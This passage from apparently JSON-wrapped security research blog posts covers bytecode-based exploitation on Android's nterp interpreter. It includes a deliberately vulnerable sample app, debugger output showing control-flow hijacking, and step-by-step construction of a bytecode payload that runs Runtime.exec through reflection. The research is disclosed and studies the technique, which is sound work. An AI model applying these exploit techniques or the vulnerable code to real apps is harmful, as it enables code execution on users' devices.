[anon:.bss]. The other memory regions are used to reference existing bytecode (framework.jar), reference the interpreter handler ExecuteNterpImpl to construct valid ArtMethod instances (libart.so), kick off gadget chain execution via GRANDFATHERED (boot.art) and reference a valid DexCache instance initialized by zygote64 (boot-framework.art). All of these memory regions have been confirmed to be duplicated upon fork in a previous blog post using maps diffing.\nOf course, a better PoC would be to construct a malicious Android app that attacks the victim app. However, creating parsers for e.g. boot.art to spot GRANDFATHERED dynamically is considered a lot of busywork and does not show more than the extern python script mimicking a local app.\nPotential Solutions From a security perspective, multiple mitigations come to mind:\nEnforce type checks at runtime. Use a kind of random token (like csrf token) sampled after the app is forked from zygote64. Then, each object holds that token as a field next to monitor_ and klass_. Upon usage of an object, the object\u0026rsquo;s token is compared to the original random token. If both tokens match, execution will continue. Otherwise, the app is aborted. Of course, these mitigations do not take into account the performance overhead introduced by all the checks. If every bytecode instruction validated a random token, performance would propably be a lot worse. On the other hand, one may argue that the interpreter started off too greedily as regards performance, and such security checks are legitimate. This is a common tradeoff: security vs. performance. Luckily, the techniques discussed in this series of blog posts are fairly hard to pull off, which severely reduces practicality.\nResponsible Disclosure All research results, including working PoCs, have been submitted to Google\u0026rsquo;s bug bounty program to ensure that publishing these blog posts does not cause any severe security problems and to give Google time to investigate the findings and respond, if necessary. Of course, there are no concrete vulnerabilities, but rather a new exploitation concept on Android. Also, I find it hard to estimate the practical impact of these blog posts, because many stars must align for bytecode injection and reuse to work, which is why I welcomed the feedback. Fortunately, Google decided the results are not a security concern and gave permission to publish blog posts on that matter!\nSummary This concludes our journey through the land of bytecode - based exploitation on Android! Here, the more advanced bytecode reuse technique is discussed, along with fundamentals necessary to grasp all concepts described. Also, some security mechanisms that immediately come to mind are mentioned without taking into account performance impact.\nNaturally, there is a lot more to be discovered about bytecode execution and exploitation on Android. The series of blog posts on Android bytecode is the result of about 1.5 years of part-time research, with some distractions along the way. Hence, the blog posts do not contain everything discovered or tested, but only the most interesting cherries! I stopped counting the rabbit holes I followed that did not provide any results or at best \u0026ldquo;funny\u0026rdquo; facts, like e.g. throw - oriented programming.\nOverall, I learned that security research on a well - known operating system like Android is similar to walking the corridor in Hilbert\u0026rsquo;s hotel: infinite options, so you really need to choose the doors you open wisely. Regardless, persistence is key to find something that is interesting, so keep learning, researching and hacking! ;)\n","permalink":"https://lolcads.github.io/posts/2024/09/bytecode_exploitation_3/","tags":["Android","Bytecode","Exploitation"],"title":"Bytecode Reuse Attack (Part 4)"},{"categories":null,"content":"Bytecode Injection (Part 3) With all the basics out of the way, this blog post shows the first bytecode - based exploitation technique on Android: bytecode injection! This opens the door to many interesting exploits, where injected bytecode can function as a one - in - all solution or an intermediate stage.\nIn order to fully understand this technique, it is recommended to read the introductory blog posts first! As of writing, there is no public information on this topic except for the Android source code.\nMotivation When exploiting a memory error, several security mechanisms must be bypassed. These include, but are not limited to, DEP/N^X, ASLR, RELRO, Canaries, and, if you are unlucky, ShadowStack, CFI and SafeStack. Notice that these security mechanisms have not been developed all at once, but rather one by one in response to emerging exploitation techniques. For example, native code injection on the stack caused the stack to be mapped with rw- instead of rwx. Another example is ASLR being a response to return - into - libc and ROP. This is called the arms race in binary exploitation, where a response from the offensive security community triggers a response from the defensive security community and vice versa.\nUnfortunately, native code is not the only resource that can be executed. Notice that native code is basically interpreted by the CPU. With that in mind, other interpreters can be investigated and analysed for whether they allow particular exploitation techniques. In case of this blog series, Android\u0026rsquo;s interpreter nterp is analysed for parallels to the exploitation techniques of native code.\nThe general motivation for why other interpreters are interesting in the context of exploitation techniques is simple: most security mechanisms are interpreter - specific, i.e. specific to execution environment (architecture, OS, \u0026hellip;). For example, DEP/N^X enforces that pages are never rwx (for the sake of the example, ignore JIT). Hence, native code injection is not feasible. However, changing the interpreter to nterp also changes the entire execution environment an attacker is working with. As we see later on, no one prevents an attacker from injecting and executing bytecode. In other words, most security mechanisms for one interpreter do not generalize to other interpreters.\nThe Problems Although impossible to prove with concrete references, I claim that nterp does not distinguish data and code. In other words, whatever the dex_pc is set to is interpreted. This is exactly what had happened decades ago with native code! Identical to early days of binary exploitation, given the ability to redirect control - flow through a memory error, nterp can be forced to execute whatever an attacker desires.\nConsider the following example. In a setting where an attacker gets access to a stack pointer and the ability to repeatedly exploit a stack - buffer index out - of - bounds write, with bytecode, it is possible to construct an exploit. Even worse, directly using classical native - level techniques like ROP seems infeasible, because ROP needs leaks on executable memory regions. So, bytecode injection opens new avenues for exploitation!\nWhile the above example works for a remote attacker, a local attacker is not even constrained by ASLR, because of Android\u0026rsquo;s fork server architecture. A local attacker in the above example enables ROP and boosts bytecode injection, because a lot of data is identical over multiple apps.\nSample App For this blog post, we construct a simple, deliberately vulnerable app with\na repeatable stack - buffer index out - of - bounds write primitive, and a single stack address leak. The idea is to create a scenario where e.g. ROP is infeasible and bytecode injection is simple. Not only does this approach ease understanding nuances of bytecode - based exploitation, but it also shows that bytecode injection is not superfluous, i.e. it is a new tool in an attacker\u0026rsquo;s tool box.\nNotice that the app assumes a remote attacker, which is facilitated using simple socket I/O. In practice, an attacker may serve a malicious website that exploits a bug in V8 or perform a MITM attack on the communication of the target app and a backend server. Now, consider the following, relevant app snippets.\nprivate void run() { while (true) { try { Log.d(TAG, \u0026#34;Initializing server....\u0026#34;); this.initServer(); Log.d(TAG, \u0026#34;Setting up connection....\u0026#34;); this.setupConnection(); // Send leak this.writeLong(MainActivity.leakStack()); // Loop until user wants to exit while (this.readBool()) { // Receive index and value for stack oob MainActivity.writeIndexed(this.readInt(), this.readLong()); } } catch (final IOException e) { e.printStackTrace(); } finally { this.close(); } if (!stayAlive) { break; } Log.d(TAG, \u0026#34;Restarting server socket....\u0026#34;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); new Thread(this::run).start(); } } public static native long leakStack(); public static native void writeIndexed(int index, long value); Below are the vulnerable, native methods invoked in the above Java code. The memory errors, i.e. a unique stack pointer leak and a repeatable stack - buffer index out - of - bounds write, manifest at the JNI layer.\nextern \u0026#34;C\u0026#34; JNIEXPORT jlong JNICALL Java_com_poc_poc_1remote_MainActivity_leakStack(JNIEnv *env, jclass clazz) { uint64_t i; return (uint64_t)\u0026amp;i; } extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_poc_poc_1remote_MainActivity_writeIndexed(JNIEnv *env, jclass clazz, jint index, jlong value) __attribute__ ((optnone)) { uint64_t i; uint64_t *buffer = \u0026amp;i; buffer[index] = value; } For some reason optimizations for writeIndexed had to be disabled, probably because some data - flow analysis in the compiler realized that the code does not really do anything meaningful, i.e. no (direct) outputs. However, this suffices for the purpose of proving that bytecode injection is possible.\nWith the above setup, a remote attacker can connect to the vulnerable app and repeatedly write on the stack. Moreover, an attacker is able to construct data structures and references to these structures on the stack, yielding a powerful primitive especially for data - oriented attacks.\nBuilding the app in release mode with default Android Studio settings yields an .apk file, which is actually a .zip file.\n$ unzip app-release.apk $ ls AndroidManifest.xml assets classes.dex DebugProbesKt.bin kotlin lib META-INF res resources.arsc There is only a single classes.dex file that must account for all Java code in the app. Moreover, the classes.dex file must contain some of the framework - related bytecode, types etc. required to launch the app. Therefore, the context of e.g. MainActivity::run is classes.dex. What is more is that classes.dex holds a lot more types and methods than are used to program the sample app. A quick .dex file analysis reveals that classes.dex indeed holds additional types and methods.\n\u0026gt; file --file unpacked_poc_remote/classes.dex --type DEX classes.dex\u0026gt; list types --regex java/lang/Runtime [Index = 0x1507]: java/lang/Runtime [Index = 0x1508]: java/lang/RuntimeException classes.dex\u0026gt; list methods --regex \u0026#34;Runtime::getRuntime\u0026#34; [Index = 0xa6ee]: java/lang/Runtime java/lang/Runtime::getRuntime() Before delving into exploitation, lets see how the native methods are invoked by MainActivity::run. To increase readability, Lcom/poc/poc_remote/MainActivity is replaced with LMainActivity, where L indicates an object type, and some formatting is done.\nclasses.dex\u0026gt; list methods --regex \u0026#34;MainActivity::run\u0026#34; [Index = 0xa51d, Offset = 0x37db10, Num Regs = 0x4]: private void MainActivity::run() [Index = 0xa51d]: void MainActivity::run() classes.dex\u0026gt; decompile method --index 0xa51d [Index = 0xa51d, Offset = 0x37db10, Num Regs = 0x4]: private void MainActivity::run() ... 001e: INVOKE_DIRECT {v3}, METHOD:LMainActivity;-\u0026gt;setupConnection()V 0024: INVOKE_STATIC {}, METHOD:LMainActivity;-\u0026gt;leakStack()J 002a: MOVE_RESULT_WIDE v0 ... 003e: INVOKE_DIRECT {v3}, METHOD:LMainActivity;-\u0026gt;readInt()I 0044: MOVE_RESULT v0 0046: INVOKE_DIRECT {v3}, METHOD:LMainActivity;-\u0026gt;readLong()J 004c: MOVE_RESULT_WIDE v1 004e: INVOKE_STATIC {v0, v1, v2}, METHOD:LMainActivity;-\u0026gt;writeIndexed(I,J)V 0054: GOTO +-17 ... Basically, invocations of MainActivity::leakStack and MainActivity::writeIndexed use the invoke-static instruction. This is not surprising, because both methods are declared using the static keyword. Unfortunately it is unclear why writeIndexed is given v2 as a third parameter. Overall, bytecode is used to execute native methods, and thus execution must eventually continue in bytecode after the native methods are done executing.\nNote: Offsets are in terms of code units. In the above code snippet, the GOTO +-17 actually references 0x54 + 2 * (-17) = 0x32. In general, each instruction uses a multiple of code units bytes, which means instruction offsets and addresses are always two - byte aligned!\nBytecode Injection From a previous blog post, we know that the bytecode return address lies on the stack. So, the layout of nterp and JNI stack frames can be used to identify what critical data is in close proximity to the oob write. Below is an excerpt from a particular app execution.\ngef➤ canary [+] The canary of process 9862 is at 0x7ff247af28, value is 0xe009ee421ed97f00 gef➤ i r sp sp 0x7c0fe66620 0x7c0fe66620 gef➤ hexdump qword $sp --size 0x28 0x7c0fe66620 │+0x0000 0x0013000000000000 // \u0026lt;-- $sp 0x7c0fe66628 │+0x0008 0x0000007c0fe66650 0x7c0fe66630 │+0x0010 0x0013000000000000 0x7c0fe66638 │+0x0018 0x0000020000000000 0x7c0fe66640 │+0x0020 0x0000007f27664480 0x7c0fe66648 │+0x0028 0xb400007d48b969f0 0x7c0fe66650 │+0x0030 0x0000000000000000 0x7c0fe66658 │+0x0038 0x66f0649020037d8d // Stack canary 0x7c0fe66660 │+0x0040 0x0000007c0fe66758 // Old base pointer (x29) 0x7c0fe66668 │+0x0048 0x0000007c14c741ac // Return address (x30) 0x7c0fe66670 │+0x0050 0x0000007f27664480 // ArtMethod* \u0026lt;---- END OF JNI FRAME 0x7c0fe66678 │+0x0058 0x0000007c0fe66748 // Padding? (Vrefs of calling method) 0x7c0fe66680 │+0x0060 0x0000000000000000 // Padding 0x7c0fe66688 │+0x0068 0x0000000000000000 // Padding? Expected d0-d7 0x7c0fe66690 │+0x0070 0x0000000000000000 // x1 0x7c0fe66698 │+0x0078 0x0000000000000000 // x2 0x7c0fe666a0 │+0x0080 0x0000000000000000 // x3 0x7c0fe666a8 │+0x0088 0x0000000000000000 // x4 0x7c0fe666b0 │+0x0090 0x0000000000000000 // x5 0x7c0fe666b8 │+0x0098 0x0000000000000000 // x6 0x7c0fe666c0 │+0x00a0 0xb400007df8b82a10 // x7 0x7c0fe666c8 │+0x00a8 0x0000000000000000 // Marking Register (MR, x20) 0x7c0fe666d0 │+0x00b0 0xb400007df8b82ad0 // Suspend (x21) 0x7c0fe666d8 │+0x00b8 0x0000007c147a64be // dex_pc_ptr (PC, x22) 0x7c0fe666e0 │+0x00c0 0x0000007c14a867f3 // Current Instruction (INST, x23) 0x7c0fe666e8 │+0x00c8 0x0000007c87400880 // Table of bytecode handlers (IBASE, x24) 0x7c0fe666f0 │+0x00d0 0x0000007c0fe66748 // VRefs (REFS, x25) 0x7c0fe666f8 │+0x00d8 0x0000007c0fe66758 // x26 (informally: vregs) 0x7c0fe66700 │+0x00e0 0x0000007c0fe66748 // x27 0x7c0fe66708 │+0x00e8 0x0000007c0fe66770 // x28 0x7c0fe66710 │+0x00f0 0x0000007c0fe66758 // FP (x29) 0x7c0fe66718 │+0x00f8 0x0000007c87409aa0 // Return address (x30) 0x7c0fe66720 │+0x0100 0x0000007f27664440 // ArtMethod* \u0026lt;---- END OF NTERP FRAME 0x7c0fe66728 │+0x0108 0x0000007f276071e0 // ArtMethod* 0x7c0fe66730 │+0x0110 0x0000007c147a62a8 // Alignment? may be a dex pc 0x7c0fe66738 │+0x0118 0x0000007c147a64be // dex_pc_ptr 0x7c0fe66740 │+0x0120 0x0000007c0fe66770 // Caller Frame Pointer (FP) 0x7c0fe66748 │+0x0128 0x0000000000000000 // Vrefs 0x7c0fe66750 │+0x0130 0x12f8084800000000 0x7c0fe66758 │+0x0138 0x0000000000000200 // Vregs 0x7c0fe66760 │+0x0140 0x12f8084800130000 Surprisingly, the JNI frame is slightly modified, as the above instance does not contain spilled floating point registers d0 to d7. However, as the comment in the JNI frame states, only a generic JNI frame is described, not concrete frames for every possible invocation scenario. An interesting observation is that gef claims the canary is 0xe009ee421ed97f00, but the disassembly of writeIndexed suggests the canary is 0x66f0649020037d8d. Apparently, Android\u0026rsquo;s Bionic library uses random canaries , which also seems to apply to Android\u0026rsquo;s runtime. Further, there are two instances of a dex_pc_ptr! From top to bottom, the first one is part of the spilled registers in the JNI frame, so it will be put back into x22 upon return to the calling method. The second one seems to be stored and managed in the nterp frame. Maybe this is used to ensure that x22 can be restored on function invocations where x22 is not spilled.\nLets verify that bytecode execution continues at whatever value is stored in the spilled x22 on the stack. Basically, we can overwrite the value with something arbitrary, like 0x4242424242424242!\ngef➤ set *(unsigned long long*)0x0000007c0fe666d8=0x4242424242424242 gef➤ c Continuing. Thread 20 \u0026#34;Thread-2\u0026#34; received signal SIGSEGV, Segmentation fault. ... $x22 : 0x4242424242424242 (\u0026#34;BBBBBBBB\u0026#34;?) ... → 0x7c87409ac0 \u0026lt;nterp_helper+1984\u0026gt; ldrh w23, [x22, #6]! // x23 = xINST (next opcode) 0x7c87409ac4 \u0026lt;nterp_helper+1988\u0026gt; and x16, x23, #0xff // x16 = first byte of next instruction 0x7c87409ac8 \u0026lt;nterp_helper+1992\u0026gt; add x16, x24, x16, lsl #7 // x16 = IBASE + opcode * \u0026lt;bytecode handler size\u0026gt; 0x7c87409acc \u0026lt;nterp_helper+1996\u0026gt; br x16 // branch to handler So, nterp tries to use the spilled register value to derive the next bytecode instruction. Thus, overwriting this value enables an attacker to redirect bytecode control - flow to any location. Most importantly, bytecode execution can be pivoted to a controlled location. In this case: the stack. Of course, either the dex_pc_ptr must be set to addr_payload-6 or the first three instructions should be NOPs to account for the added 6 in the faulting instruction, i.e. the size of the invoke-static instruction used to invoke writeIndexed.\nWith the ability to control where nterp continues execution, it remains to figure out what to execute.\nBuilding a Bytecode Payload First of all, the goal must be clarified. In this case, the goal is command execution in the context of the vulnerable app using only bytecode. However, gaining native code execution using bytecode as intermediate stage to set up e.g. the stack is also possible. Command execution is chosen, because it involves calling at least one legitimate method. Therefore, showing that command execution is possible also proves that bytecode injection is capable of invoking normal library or application - specific methods, despite coming from a memory error. For simplicity, we try to get the following Java code directly in bytecode.\nRuntime.getRuntime().exec(\u0026#34;log Hello\u0026#34;); Naively translating this to bytecode, e.g. by creating a PoC app, building it and decompiling the .apk file or using d8 , yields the first payload version.\nclasses.dex\u0026gt; list methods --regex Runtime::getRuntime [Offset = 0x0]: classes.dex [Index = 0xa254]: Runtime Runtime::getRuntime() classes.dex\u0026gt; list methods --regex \u0026#34;MainActivity::simpleShellcode\u0026#34; [Offset = 0x0]: classes.dex [Index = 0xa097, Offset = 0x363638, Num Regs = 0x2]: private void MainActivity::simpleShellcode() [Index = 0xa097]: void MainActivity::simpleShellcode() classes.dex\u0026gt; decompile method --index 0xa097 [Index = 0xa097, Offset = 0x363638, Num Regs = 0x2]: private void MainActivity::simpleShellcode() 0000: INVOKE_STATIC {}, METHOD:LRuntime;-\u0026gt;getRuntime()LRuntime; 0006: MOVE_RESULT_OBJECT v1 0008: CONST_STRING v0, STRING:\u0026#34;log Hello\u0026#34;(14) 000c: INVOKE_VIRTUAL {v1, v0}, METHOD:LRuntime;-\u0026gt;exec(LString;)LProcess; 0012: RETURN_VOID With such a payload at hand, one may be tempted to copy it over and try it! However, as another app is used to construct this payload, most certainly type and method indices are incorrect. An example is that invoke-static invokes the Runtime::getRuntime method with index 0xa254. From a previous section it is known that the sample app uses Runtime::getRuntime with index 0xa6ee. Therefore, these indices are incompatible. The same holds for the String constant \u0026quot;log Hello\u0026quot;. Most certainly the vulnerable app does not even contain such a String constant! Therefore, to get command execution using Runtime.getRuntime().exec(\u0026quot;...\u0026quot;), we need to construct a payload that is more dynamic. To that end, we strive for the following properties:\ndynamic String instances dynamic method invocation Using a different app is helpful to get the overall payload layout and avoids having to deal with e.g. register allocations. However, a context is often app - specific, which must be considered during payload construction.\nDynamic Strings As discussed in a previous blog post, the instruction fill-array-data can be used to fill an array with data directly located inside the bytecode. So, long story short, an arbitrary char[] can be constructed using fill-array-data. For this to work, an attacker needs to know the type index of a char[]. Luckily, the char[] type is used frequently, so it most likely resides in any .dex we encounter. For a start the payload looks like below:\nnew-array v0, \u0026lt;length\u0026gt;, char[] fill-array-data v0, +\u0026lt;byte offset//2\u0026gt; ... [fill-array-data-payload] ident=0x0300 element_width=0x2 size=len(command) data=[ command[0], ..., command[-1] ] From now on, assume an attacker has a char[] instance describing a command, like \u0026quot;log Hello\u0026quot;. The next step is to construct a String from a char[]. On Android, StringBuilder is the type of choice. Again, it is used so frequently that every .dex file is expected to contain the corresponding type. The main challenge is whether StringBuilder::append(char[]) exists. In case of the vulnerable app it does, but it may not be the case for another app. If there is no way to construct a String from bytecode, an attacker can also inject a fake String object (see next post regarding bytecode reuse). Continuing with the StringBuilder, consider the following analysis:\nclasses.dex\u0026gt; list types --regex \u0026#34;StringBuilder\u0026#34; [Index = 0x150f]: StringBuilder classes.dex\u0026gt; list methods --regex \u0026#34;StringBuilder::append\u0026#34; [Index = 0xa750]: StringBuilder StringBuilder::append([C) classes.dex\u0026gt; list methods --regex \u0026#34;StringBuilder::\u0026lt;init\u0026gt;\u0026#34; [Index = 0xa741]: void StringBuilder::\u0026lt;init\u0026gt;() classes.dex\u0026gt; list methods --regex \u0026#34;StringBuilder::toString\u0026#34; [Index = 0xa75d]: String StringBuilder::toString() As the name suggests, StringBuilder::\u0026lt;init\u0026gt;() is the constructur of StringBuilder that does not take any parameters. In Java, invoking this constructor is done via new StringBuilder(). Overall, the following Java snippet describes what we try to do directly in bytecode:\nchar[] c = new char[] {\u0026#39;l\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;o\u0026#39;}; StringBuilder b = new StringBuilder(); b.append(c); String command = b.toString(); Putting together all the pieces and equipped with the bytecode documentation and a sample app for payload creation, the following bytecode can be constructed:\n0000: CONST_16 v0, #+\u0026lt;len(command)\u0026gt; 0004: NEW_ARRAY v0, v0, TYPE:char[] 0008: FILL_ARRAY_DATA v0, +\u0026lt;offset to command data // 2\u0026gt; 000e: NEW_INSTANCE v1, TYPE:StringBuilder 0012: INVOKE_DIRECT {v1}, METHOD:StringBuilder-\u0026gt;\u0026lt;init\u0026gt;() 0018: INVOKE_VIRTUAL {v1, v0}, METHOD:StringBuilder-\u0026gt;append(char[]) 001e: INVOKE_VIRTUAL {v1}, METHOD:StringBuilder-\u0026gt;toString() 0024: MOVE_RESULT_OBJECT v2 ... offset command data: [fill-array-data-payload] After the above bytecode is executed, v2 contains a reference to a String object with contents \u0026quot;log Hello\u0026quot;. Notice that this bytecode is independent of the String\u0026rsquo;s semantics, i.e. this is a generic approach for constructing a String instance from a char[] and not specific to a system command! The only components that need to change for a new String are length fields and the array contents. Of course, one may have to use new vregs to prevent existing vregs from being clobbered.\nNote: Calling the constructor on a newly created instance is sometimes optional. If the goal is to create a valid object, then one may only use new-instance, which means the index of the constructor method can be ignored. Of course, using the object later on may cause unexpected behaviour, including crashes.\nProblem with String Constructors One might ask why StringBuilder::append(char[]) is preferred over String::\u0026lt;init\u0026gt;(char[]). This is motivated by the fact that Strings are disabled on Android. At least the source code suggests that StringFactory should be used instead of the String type directly:\npublic String(char value[]) { // BEGIN Android-changed: Implemented as compiler and runtime intrinsics. /* this(value, 0, value.length, null); */ throw new UnsupportedOperationException(\u0026#34;Use StringFactory instead.\u0026#34;); // END Android-changed: Implemented as compiler and runtime intrinsics. } Therefore, we directly use the StringBuilder type, also because it is used frequently and easy to use. Notice that although String constructors cannot be easily used, this does not imply that the String type occurs less frequently!\nDynamic Method Invocation The problem to solve is as follows. Goal is to call Runtime.getRuntime().exec(command), but it cannot be assumed that the context of the bytecode provides the method indices for getRuntime and exec. Actually, Runtime.getRuntime() is very common, because it occurs in the context, although the method and Runtime type are not explicitly used in the vulnerable app:\nclasses.dex\u0026gt; list types --regex \u0026#34;Runtime\u0026#34; [Index = 0x1507]: Runtime classes.dex\u0026gt; list methods --regex \u0026#34;Runtime::getRuntime\u0026#34; [Index = 0xa6ee]: Runtime Runtime::getRuntime() classes.dex\u0026gt; list methods --regex \u0026#34;Runtime::exec\u0026#34; classes.dex\u0026gt; Unfortunately, Runtime::exec is not very common. Luckily, Java provides a feature called reflection. Obviously, the name of the function to be invoked is known, i.e. \u0026quot;exec\u0026quot;. So, in Java, dynamically resolving the method looks like so:\nRuntime.getRuntime().getClass().getDeclaredMethod(\u0026#34;exec\u0026#34;, [String.class]); As can be seen in the above examples, including dynamic String creation, successful bytecode creation involves a lot of creativity and thinking out - of - the - box to find semantically fitting bytecode instruction sequences that use as few context - specific resources as possible. While it is possible to use Java code to construct the initial bytecode layout, indices etc. must be adjusted to fit the context. Bytecode generated from Java code may use e.g. types that are not available in the context.\nThe String type is also very common, so it can be assumed to be available in all .dex files and thus in every context an attacker encounters. With all that, the bytecode can be seen below. Notice that v6 := \u0026quot;exec\u0026quot;.\n003a: INVOKE_STATIC {}, METHOD:Runtime-\u0026gt;getRuntime() 0040: MOVE_RESULT_OBJECT v4 0042: INVOKE_VIRTUAL {v4}, METHOD:Object-\u0026gt;getClass() 0048: MOVE_RESULT_OBJECT v5 0052: CONST_4 v7, #+1 0054: NEW_ARRAY v7, v7, TYPE:[Class 0058: CONST_4 v8, #+0 005a: CONST_CLASS v9, TYPE:String 005e: APUT_OBJECT v9, v7, v8 0062: INVOKE_VIRTUAL {v5, v6, v7}, METHOD:Class-\u0026gt;getDeclaredMethod(String,Class[]) An alternative approach may be to use Runtime.class.getDeclaredMethod(...). However, we need the instance of Runtime for invocation of exec. This approach may save us the getClass invocation, although this would most likely be replaced with an equivalent instruction.\nWhat is left to do is to invoke the resolved method. Of course, invocation depends on what parameters the target method expects. The below code snippet continues with calling exec.\n0068: MOVE_RESULT_OBJECT v5 006a: v6 := \u0026#34;log Hello\u0026#34; ... 0072: FILLED_NEW_ARRAY {v6}, TYPE:[LObject; 0078: MOVE_RESULT_OBJECT v6 007a: INVOKE_VIRTUAL {v5, v4, v6}, METHOD:LMethod;-\u0026gt;invoke(LObject;,[LObject;) For simplicity, I omitted the creation of the \u0026quot;log Hello\u0026quot; command.\nObserve that dynamically invoking methods using reflection requires knowledge of specific type and method indices, among which are:\nClass[], String and Object[] type indices Runtime::getRuntime(), Object::getClass(), Class::getDeclaredMethod(String, Class[]) and Method::invoke(Object, Object[]) method indices With the above approaches, i.e. dynamic strings and method invocations, it is possible to get command execution using only bytecode from a memory error in a vulnerable app. Or so you may think, but the execution environment is cruel, especially as regards vreg allocations!\nLimited, dynamic Vregs A method specifies the amount of vregs needed to work in its associated code_item . When executing a method, nterp allocates as many vregs (and vrefs) as specified on the stack. Now, what happens if the hijacked method requested 4 vregs, but the payload uses 10? As has been discussed in a previous blog post, vregs and vrefs have the following properties:\nVrefs array precedes vregs array on stack. Vrefs array is adjacent to vregs array. Vrefs and vregs are parallel and entries are semantically linked. For example, vreg v0 is linked to vref r0. Vrefs and vregs array accesses are not bounds - checked. Continuing the example, accessing vregs v0 to v3 is legitimate. However, accessing v4 is problematic. In case the access to v4 is a write, then r4 will most likely also be overwritten. The problem is that r4 accesses the first value after the actual vrefs array, i.e. v0. Therefore, if something is stored into v0 and then e.g. a constant is written to v4, then v0 will be modified, in this case set to 0. Also, the first 32-bit value after vregs is changed to be the constant assigned to v4. This has the neat side - effect that an attacker can fully read and write stack values located after vrefs and vregs, enabling attacks like JITROP. From a bytecode perspective, depending on the amount of registers used in the payload, this is problematic, because registers holding important data like Runtime instance may be clobbered.\nThis is where math can save the day! Say the hijacked method requested N vregs. Then, the first overlap happens at v\u0026lt;N\u0026gt;, because this may also set r\u0026lt;N\u0026gt;, which overlaps with v0. So, to prevent overflowing into the vregs, an access to v\u0026lt;N\u0026gt; can be set to v\u0026lt;N+N\u0026gt;. This skips over the entire vregs array, and thus reinterprets the region after vregs as a fresh vrefs - vregs array pair. Hence, the mapping is N -\u0026gt; N+N, but what happens in case v\u0026lt;N+1\u0026gt; or v\u0026lt;N+2\u0026gt; are accessed? And what about v\u0026lt;N+N+N+2\u0026gt;? To resolve this problem, observe that each block, i.e. vregs accesses that do not overflow into the following block, is of size N * 2. The first block consists of the original vrefs and vregs, in that order, each of length N. Say the payload needs M vregs to work. Then the number of blocks is k := M // N + 1, where // is integer - division. Also, for a vreg index X, compute the offset into a block as X % N. Now, if vreg v\u0026lt;X\u0026gt; with 0 \u0026lt;= X \u0026lt; M is to be accessed, then compute block id X // N and offset X % N. The actual vreg access is then v\u0026lt;(X // N) * (N * 2) + (X % N)\u0026gt;. To summarize,\nX // N: Block id N * 2: Block size in register entries X % N: Offset within a block Consider the following visualization for the case where the payload uses 10 vregs, the hijacked method only allocated memory for 4 vregs, and the payload tries to access vreg v4. Of course, whatever data overlaps with the artificial blocks is corrupted. Hence, care must be taken when using this approach. Luckily, blocks can be shifted up the stack until no critical data is overwritten. With a simple function, this can be abstracted away, so we never have to do math again:\nv = lambda i: (i // available_vregs) * (2 * available_vregs) + (i % available_vregs) v0 = v(0) v1 = v(1) v2 = v(2) v3 = v(3) v4 = v(4) The Payload Finally, with all caveats aside, the final payload can be constructed. It is beneficial to implement a BytecodeBuilder , which dynamically builds bytecode based on the documentation . This eases testing and constructing different kinds of payloads! In this case study, the payload can be fully expressed like below. Note that the comments do not always show the correct indices, lengths and offsets. Most of these values are computed dynamically or change with the payload size and layout. Also, another app is used to generate the payload layout and avoid having to deal with register allocations. The app is forced to use the tricks for dynamic strings and method invocations on Java - level.\nbuilder = BytecodeBuilder(type_map={ \u0026#39;char[]\u0026#39;: char_array_index, \u0026#39;StringBuilder\u0026#39;: stringbuilder_index, \u0026#39;Class[]\u0026#39;: classarray_index, \u0026#39;String\u0026#39;: string_index, \u0026#39;Object[]\u0026#39;: objectarray_index, \u0026#39;Object\u0026#39;: object_index, }) # [Index = 0x5, Offset = 0x31c, Num Regs = 0xa]: private static void com/poc/shellcode/MainActivity::shellcode() return (builder # 0000: 13 00 12 00 CONST_16 v0, #+18 .const_16(v0, len(command)) # 0004: 23 00 13 00 NEW_ARRAY v0, v0, TYPE:[C .new_array(v0, v0, \u0026#39;char[]\u0026#39;) # 0008: 26 00 3e 00 00 00 FILL_ARRAY_DATA v0, +62 .fill_array_data(v0, 65) # 000e: 22 01 0d 00 NEW_INSTANCE v1, TYPE:Ljava/lang/StringBuilder; .new_instance(v1, \u0026#39;StringBuilder\u0026#39;) # 0012: 70 10 0b 00 01 00 INVOKE_DIRECT {v1}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;()V .invoke_direct(1, stringbuilder_constructor_index, [v1]) # 0018: 6e 20 0c 00 01 00 INVOKE_VIRTUAL {v1, v0}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;append([C)Ljava/lang/StringBuilder; .invoke_virtual(2, stringbuilder_append_chararray_index, [v1, v0]) # 001e: 12 42 CONST_4 v2, #+4 .const_16(v2, 4) # 0020: 23 22 13 00 NEW_ARRAY v2, v2, TYPE:[C .new_array(v2, v2, \u0026#39;char[]\u0026#39;) # 0024: 26 02 46 00 00 00 FILL_ARRAY_DATA v2, +70 .fill_array_data(v2, 65) # 002a: 22 03 0d 00 NEW_INSTANCE v3, TYPE:Ljava/lang/StringBuilder; .new_instance(v3, \u0026#39;StringBuilder\u0026#39;) # 002e: 70 10 0b 00 03 00 INVOKE_DIRECT {v3}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;\u0026lt;init\u0026gt;()V .invoke_direct(1, stringbuilder_constructor_index, [v3]) # 0034: 6e 20 0c 00 23 00 INVOKE_VIRTUAL {v3, v2}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;append([C)Ljava/lang/StringBuilder; .invoke_virtual(2, stringbuilder_append_chararray_index, [v3, v2]) # 003a: 71 00 09 00 00 00 INVOKE_STATIC {}, METHOD:Ljava/lang/Runtime;-\u0026gt;getRuntime()Ljava/lang/Runtime; .invoke_static(0, getruntime_index, []) # 0040: 0c 04 MOVE_RESULT_OBJECT v4 .move_result_object(v4) # 0042: 6e 10 08 00 04 00 INVOKE_VIRTUAL {v4}, METHOD:Ljava/lang/Object;-\u0026gt;getClass()Ljava/lang/Class; .invoke_virtual(1, object_getclass_index, [v4]) # 0048: 0c 05 MOVE_RESULT_OBJECT v5 .move_result_object(v5) # 004a: 6e 10 0d 00 03 00 INVOKE_VIRTUAL {v3}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; .invoke_virtual(1, stringbuilder_tostring_index, [v3]) # 0050: 0c 06 MOVE_RESULT_OBJECT v6 .move_result_object(v6) # 0052: 12 17 CONST_4 v7, #+1 .const_16(v7, 1) # 0054: 23 77 14 00 NEW_ARRAY v7, v7, 